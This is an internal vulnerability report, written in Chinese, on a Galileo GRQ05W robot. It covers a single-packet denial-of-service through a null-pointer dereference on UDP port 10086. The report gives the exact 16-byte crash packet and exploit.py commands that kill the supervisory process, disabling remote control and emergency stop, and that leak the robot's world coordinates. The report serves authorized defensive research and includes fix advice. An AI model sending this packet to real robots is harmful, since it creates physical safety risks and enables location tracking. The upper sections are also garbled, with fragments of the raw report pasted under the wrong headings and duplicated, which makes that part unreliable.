---
编号: GAL-008
验证状态: 动态确认
严重程度: 中
披露状态: 内部研究
源平台: 伽利略
源候选目录: UDP10086空指针单包DoS
---
# GAL-008 伽利略（Galileo）机器人 UDP 10086 空指针解引用单包 DoS 漏洞报告

## 1. 一句话结论

- \| 漏洞类型 \| 空指针解引用（CWE-476）→ 未授权远程拒绝服务 \|
- \| 权限 \| 任意可达 UDP 10086 的主机（未授权） \|
- ## 1. 漏洞概述
- - 未授权远程单包（16B）确定性崩溃监管主进程——可反复触发持续 DoS；
- - 附带：cmd 0x901 未授权泄露 169B 实时遥测（含世界坐标，位置追踪）。

## 2. 影响产品与版本

- \| 目标设备 \| 伽利略（Galileo）GRQ05W 轮足机器人（固件 galileo-inter 1.0.44） \|
- \| 漏洞组件 \| `galileo-robot-monitor/lib/libNetworkSdk.so`（monitor_manager 常驻加载） \|
- \| 漏洞类型 \| 空指针解引用（CWE-476）→ 未授权远程拒绝服务 \|
- \| 授权边界 \| 仅对自有设备、隔离环境进行 \|
- ## 4. 复现（adb 桥接版 exploit.py，攻击前后自动对比服务）
- python exploit.py verify            # 先查当前服务（不发包）

## 3. 验证状态

`动态确认`。该状态来自源报告的验证边界；迁移过程不把目录名称自动视为动态确认。

## 4. 攻击前提

攻击前提以脱敏研究正文为准；复现必须使用自有设备、隔离网络和授权环境，不得对第三方设备执行写入、控制或破坏性操作。

## 5. 根本原因

- 与已实测的栈溢出（#14，需 1024B payload 越界）并列的**第二条单包崩溃路径**，

## 6. 攻击过程

源报告描述的入口、协议和利用顺序见第 13 节脱敏正文；本目录只保留最小复现材料，不复制原始大型证据。

## 7. 实际影响

- \| 0x901 \| `RobotStatus@0x6C77C` \| 回复 169B ROBOT_STATUS（含世界坐标 `Pos_world[3]`）→ 信息泄露 \|
- UDP 10086 / ZMQ 5555 / TCP 8888 / LCM 订阅者 / 系统状态 / 语音控制全部面。
- python exploit.py status            # cmd 0x901 收 169B 状态（含 Pos_world 泄露）
- ## 5. 影响范围
- - 运行中触发 = 遥控/网络控制/急停链路全部瞬间下线（物理安全）；
- - 附带：cmd 0x901 未授权泄露 169B 实时遥测（含世界坐标，位置追踪）。

## 8. 复现方法

复现材料见 [复现材料清单](复现/材料清单.md)。导入脚本已做文本脱敏；未导入的原始脚本、日志、抓包和二进制见根目录材料清单。

## 9. 支撑证据

见 [证据材料清单](证据/材料清单.md) 和本页第 13 节。来源文件只登记哈希和本地保管路径，不把原始敏感材料带入 Git。

## 10. 修复建议

- 对入口实施身份认证、细粒度授权、消息完整性校验和重放防护；
- 对路径、长度、协议字段、文件类型和状态转换使用允许列表；
- 删除硬编码凭据并轮换已暴露材料；
- 对高风险服务降权，增加审计日志和负向回归测试。

## 11. 相关 AI 会话

当前未发现与该报告一一对应的完整 Claude Code 会话记录；如后续补齐，将在 [AI 会话索引](../../../../../AI轨迹/会话索引.md) 中登记。

## 12. 披露记录

- 当前披露状态：内部研究。
- 对外披露前必须重新审查凭据、设备标识、证据和厂商协调状态。

## 13. 脱敏后的原始研究正文

# 伽利略（Galileo）机器人 UDP 10086 空指针解引用单包 DoS 漏洞报告

| 项 | 值 |
|---|---|
| 目标设备 | 伽利略（Galileo）GRQ05W 轮足机器人（固件 galileo-inter 1.0.44） |
| 漏洞组件 | `galileo-robot-monitor/lib/libNetworkSdk.so`（monitor_manager 常驻加载） |
| 漏洞类型 | 空指针解引用（CWE-476）→ 未授权远程拒绝服务 |
| 攻击面 | UDP 10086（0.0.0.0，仅 4B magic 校验） |
| 权限 | 任意可达 UDP 10086 的主机（未授权） |
| PoC 重量 | **单包 16 字节，无 payload** |
| 发现来源 | 外部 round-2 审计 `AUD-w2sdk-udp10086-nullderef-dos`；我方指令级独立复核确认 |
| 复现日期 | 2026-08-29（静态指令级确证；实机待设备在线） |
| 授权边界 | 仅对自有设备、隔离环境进行 |

---

## 1. 漏洞概述

`NetworkAppImpl` 在 UDP 10086 命令分发表中注册了三个小 cmd（我方此前仅还原过
0x31xxxxxx 系列，此组漏网）：

| cmd | handler | 行为 |
|---|---|---|
| 0x901 | `RobotStatus@0x6C77C` | 回复 169B ROBOT_STATUS（含世界坐标 `Pos_world[3]`）→ 信息泄露 |
| **0x902** | `RobotLaserPointClouds@0x6C878` | **以 data=NULL 调用 SendDataToUdp → 解引用地址 0 → 崩溃** |
| **0x904** | `RobotVersion@0x6C8AC` | 同上 |

`SendDataToUdp` 的 `type==0`（内联参数编码）分支从 payload 指针取参数字：
`LDR X0,[SP,#40]`（取 data=NULL）→ `LDR W0,[X0]`（**读地址 0**）→ SIGSEGV。
`orrt_monitor_manager_main` 是唯一监管守护进程，崩溃即同时带走
UDP 10086 / ZMQ 5555 / TCP 8888 / LCM 订阅者 / 系统状态 / 语音控制全部面。

与已实测的栈溢出（#14，需 1024B payload 越界）并列的**第二条单包崩溃路径**，
且完全无需 payload、更隐蔽、触发确定性 100%。

## 2. 指令级证据（我方手工反汇编，非采信外部报告）

```
① cmd 注册（NetworkAppImplInit cmd 表）：
   0x69878: movz #0x901    0x698a4: movz #0x902    0x698d0: movz #0x904

② handler 传 NULL（两个函数同构）：
   RobotLaserPointClouds@0x6C878              RobotVersion@0x6C8AC
   0x6c888: BL 0x60e80 (GetInstance)           0x6c8bc: BL 0x60e80
   0x6c88c: mov  w4, #0      ; len = 0         0x6c8c0: mov  w4, #0
   0x6c890: mov  x3, #0      ; ★ data = NULL   0x6c8c4: mov  x3, #0
   0x6c894: movz w2, #0      ; type = 0        0x6c8c8: movz w2, #0
   0x6c898: movz w1, #0x902                    0x6c8cc: movz w1, #0x904
   0x6c89c: BL 0x5cf40 (发送)                  0x6c8d0: BL 0x5cf40

③ SendDataToUdp@0x6AEC8 type==0 分支（与外部报告所指 0x6AF48 逐字节吻合）：
   0x6af40: B.cond             ; type==0 分支入口
   0x6af44: LDR X0, [SP,#40]   ; 取 data 指针（= NULL）
   0x6af48: LDR W0, [X0]       ; ★★★ 解引用地址 0 → SIGSEGV
```

## 3. 攻击链

```
攻击者（同 WiFi，零凭据）
   │ UDP 单包 16B: 55AA55AA | 0902(小端) | 00000000 | 00000000
   ▼
ProcessData(type=0) → RobotLaserPointClouds/RobotVersion
   │ data=NULL, type=0
   ▼
SendDataToUdp type==0 分支 → LDR W0,[NULL] → SIGSEGV
   ▼
monitor_manager 崩溃（不自动拉起）
   └─ 同时下线: UDP10086 / ZMQ5555 / TCP8888 / LCM / 语音 / 系统状态
```

## 4. 复现（adb 桥接版 exploit.py，攻击前后自动对比服务）

```bash
python exploit.py verify            # 先查当前服务（不发包）
python exploit.py smash             # ★ 16B 单包崩溃（前后 ps + 5555/10086 端口对比）
python exploit.py smash --cmd 904   # 0x904 变体
python exploit.py status            # cmd 0x901 收 169B 状态（含 Pos_world 泄露）
```

关键证据输出：攻击前（monitor_manager PID/etime 在线、5555/10086 OPEN）→
攻击后（进程消失、端口 CLOSED）。

## 5. 影响范围

- 未授权远程单包（16B）确定性崩溃监管主进程——可反复触发持续 DoS；
- 运行中触发 = 遥控/网络控制/急停链路全部瞬间下线（物理安全）；
- 附带：cmd 0x901 未授权泄露 169B 实时遥测（含世界坐标，位置追踪）。

## 6. 修复建议

1. `SendDataToUdp` type==0 分支对 data 指针判空；
2. `RobotLaserPointClouds`/`RobotVersion` 的回复数据改由栈上有效缓冲传入；
3. 与 UDP 10086 全协议的认证/来源校验缺失问题一并整改（见 #8/#14）。

## 7. 证据

- `evidence/指令级验证_20260829.md`：上述反汇编 dump 与检索过程
- 外部 round-2 原文：`AUD-w2sdk-udp10086-nullderef-dos.md`（含其复审记录）
- 关联：#14 栈溢出（同进程另一崩溃路径，已实机闭环）；#18（0x901 状态反射增强）
